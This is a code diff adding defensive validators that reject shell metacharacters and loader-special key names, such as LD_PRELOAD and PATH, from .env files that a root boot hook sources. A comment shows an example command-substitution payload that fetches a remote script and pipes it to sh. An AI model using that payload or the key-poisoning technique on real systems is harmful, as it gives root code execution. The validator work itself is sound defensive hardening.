@@ -38,6 +38,20 @@ class AppsRootNameError(SyrvisError):
     code = "apps_root_name_invalid"
 
 
+class EnvValueError(SyrvisError):
+    """Raised when a ``.env`` key or value is unsafe to write (design/70, P6).
+
+    The root boot hook ``source``s ``$SYRVIS_HOME/config/.env`` as bash, so a
+    value carrying a shell metacharacter — or a KEY NAME the loader treats
+    specially — is root code execution at the next boot (or, for a loader key
+    like ``PATH``/``LD_PRELOAD``, reboot-free via a poisoned ``os.environ``).
+    This is the fail-closed guard the ``.env`` writers apply so a hostile value
+    can never reach the file. See ``env_value_hazard`` / ``env_key_hazard``.
+    """
+
+    code = "env_value_unsafe"
+
+
 # Schema version for manifest compatibility
 # Must match syrviscore_manager.manifest.MANIFEST_SCHEMA_VERSION
 MANIFEST_SCHEMA_VERSION = 3
@@ -372,6 +386,86 @@ def read_env_value(env_path, key: str) -> str:
             value = value[1:-1]
         return value
     return ""
+
+
+# =============================================================================
+# .env write-time safety (design/70, P6 — the boot-hook injection class)
+# =============================================================================
+# The root boot hook sources config/.env as bash (`set -a; . .env`). Two vectors:
+#   (1) a VALUE carrying a shell metacharacter → command substitution runs as root
+#       at boot: `FOO=$(curl -sk http://x/y|sh)`.
+#   (2) a hazardous KEY NAME → the CLI's own dotenv loader does
+#       `load_dotenv(override=True)`, poisoning os.environ; a later bare `docker`
+#       (no env=) then runs an attacker's PATH. That is REBOOT-FREE root RCE.
+# These predicates are the single definition of "what may be written into a .env",
+# applied fail-closed at every writer. Pure, stdlib, no I/O — mirrored (by value)
+# in home-tech render/nas_env.py so the laptop refuses to render an unsafe file.
+
+# Shell-hazardous characters in a VALUE. A legitimate secret/config value in this
+# system is printable, single-line, no shell metacharacters. Rejecting is a loud,
+# local failure; the alternative (a root shell at boot) is not recoverable.
+_ENV_VALUE_HAZARD_RE = re.compile(r"""[$`\\;&|<>()\n\r\t]""")
+
+# KEY NAMES a loader/shell treats specially. A .env should never redefine these.
+_ENV_KEY_HAZARDS = frozenset({
+    "PATH", "IFS", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
+    "PYTHONPATH", "PYTHONSTARTUP", "BASH_ENV", "ENV", "SHELLOPTS", "PS4",
+    "PROMPT_COMMAND", "GIT_SSH_COMMAND",
+})
+# A legal env key: letters/digits/underscore, not starting with a digit.
+_ENV_KEY_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
+
+
+def env_value_hazard(value):
+    """Return a reason string if ``value`` is unsafe to write into a ``.env``, else None.
+
+    Pure. Flags shell metacharacters and leading/trailing whitespace (which a
+    ``source`` would eat or misparse). Empty and plain printable values pass.
+    """
+    if value is None:
+        return None
+    if value != value.strip():
+        return "value has leading/trailing whitespace"
+    m = _ENV_VALUE_HAZARD_RE.search(value)
+    if m:
+        return "value contains shell-hazardous character {!r}".format(m.group(0))
+    return None
+
+
+def env_key_hazard(key):
+    """Return a reason string if ``key`` is an unsafe ``.env`` key name, else None. Pure."""
+    if not _ENV_KEY_RE.match(key or ""):
+        return "key {!r} is not a bare [A-Za-z_][A-Za-z0-9_]* name".format(key)
+    if key in _ENV_KEY_HAZARDS:
+        return "key {!r} is a loader/shell-special name that a .env must not redefine".format(key)
+    return None
+
+
+def env_file_hazards(text):
+    """Scan rendered ``.env`` text; return a list of ``(key, reason)`` for every hazard.
+
+    Parses only column-zero ``KEY=VALUE`` lines (optionally ``export KEY=``), the
+    flat shape the writers emit; comments and blanks are skipped. Same dumb parse
+    as :func:`read_env_value`, so it sees exactly what the boot hook would source.
+    """
+    findings = []
+    for raw in (text or "").splitlines():
+        line = raw.strip()
+        if not line or line.startswith("#") or "=" not in line:
+            continue
+        if line.startswith("export "):
+            line = line[len("export ") :].lstrip()
+        key, _, value = line.partition("=")
+        key = key.strip()
+        if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
+            value = value[1:-1]
+        kr = env_key_hazard(key)
+        if kr:
+            findings.append((key, kr))
+        vr = env_value_hazard(value)
+        if vr:
+            findings.append((key, vr))
+    return findings
 
 
 def validate_apps_root_name(value: str) -> str:
